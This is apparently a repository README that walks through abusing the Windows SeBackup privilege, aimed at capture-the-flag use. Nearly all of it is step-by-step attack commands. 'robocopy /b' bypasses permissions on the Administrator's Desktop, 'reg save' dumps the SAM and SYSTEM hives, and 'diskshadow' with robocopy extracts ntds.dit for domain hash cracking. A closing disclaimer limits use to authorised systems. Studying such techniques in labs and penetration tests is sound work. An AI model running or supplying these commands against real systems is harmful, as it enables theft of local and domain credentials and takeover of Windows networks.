# SeBackup-Privilege Abuse

This repository contains a script and instructions to demonstrate the abuse of the SeBackup privilege in Windows environments. The SeBackup privilege allows a user to bypass file permissions and copy files, which can be leveraged to retrieve sensitive information.

## Description

The provided script demonstrates how to:

1. Retrieve files from the Administrator's Desktop (directly get the root flag for CTF's).
2. Copying SAM and SYSTEM files for dumping local hashes.
3. Generating the ntds.dit file, which contains the Active Directory database, for dumping domain hashes.

## Usage
### Prerequisites
SeBackupPrivilege enabled for the user executing the script.

## Steps
### ---> Retrieve files from the Administrator's Desktop (directly get the root flag for CTF's)

Use the robocopy command with the /b switch to bypass file permissions and copy files from the Administrator's Desktop.

`robocopy /b C:\Users\Administrator\Desktop\ C:\`

### ---> Copying SAM and SYSTEM files for dumping local hashes
Use the reg command to save the SAM and SYSTEM file in PWD.

`reg save hklm\sam sam` <br />
`reg save hklm\system system`

### ---> Generating the ntds.dit file, which contains the Active Directory database, for dumping domain hashes

Download and move the `script.txt` file on the Windows machine:

Execute the Diskshadow utility with the prepared script and Use robocopy again to copy the ntds.dit file to PWD:

`diskshadow /s script.txt` <br />
`robocopy /b E:\Windows\ntds . ntds.dit`

## Disclaimer

This script is provided for educational purposes only. Unauthorized access to computer systems is illegal and unethical. Use this script only on systems you own or have explicit permission to test.

## Contributing

If you have any improvements or suggestions, feel free to submit a pull request or open an issue.

